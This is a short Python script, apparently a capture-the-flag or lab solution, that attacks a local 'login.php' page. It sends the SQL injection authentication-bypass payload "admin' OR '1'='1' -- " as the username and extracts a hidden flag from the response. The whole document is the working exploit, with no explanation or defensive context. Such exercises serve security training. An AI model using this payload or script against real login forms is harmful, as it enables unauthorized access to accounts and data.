import requests

# URL of the vulnerable login.php script
url = 'http://localhost/login.php'

# Define the payload for SQL injection (assuming 'admin' user)
payload = {
    'username': "admin' OR '1'='1' -- ",
    'password': "password"  # This value doesn't matter due to the SQL injection
}

# Send POST request with the payload
response = requests.post(url, data=payload)

# Check if the request was successful
if response.status_code == 200:
    # Check if the hidden flag is in the response content
    if 'Hidden Flag' in response.text:
        print("SQL Injection Successful!")
        # Extract the hidden flag from the response
        hidden_flag_start = response.text.find('Hidden Flag: ') + len('Hidden Flag: ')
        hidden_flag_end = response.text.find('</br>', hidden_flag_start)
        hidden_flag = response.text[hidden_flag_start:hidden_flag_end].strip()
        print(f"Hidden Flag: {hidden_flag}")
    else:
        print("SQL Injection Failed - Hidden Flag not found in response.")
else:
    print(f"Failed to execute SQL Injection - Status Code: {response.status_code}")
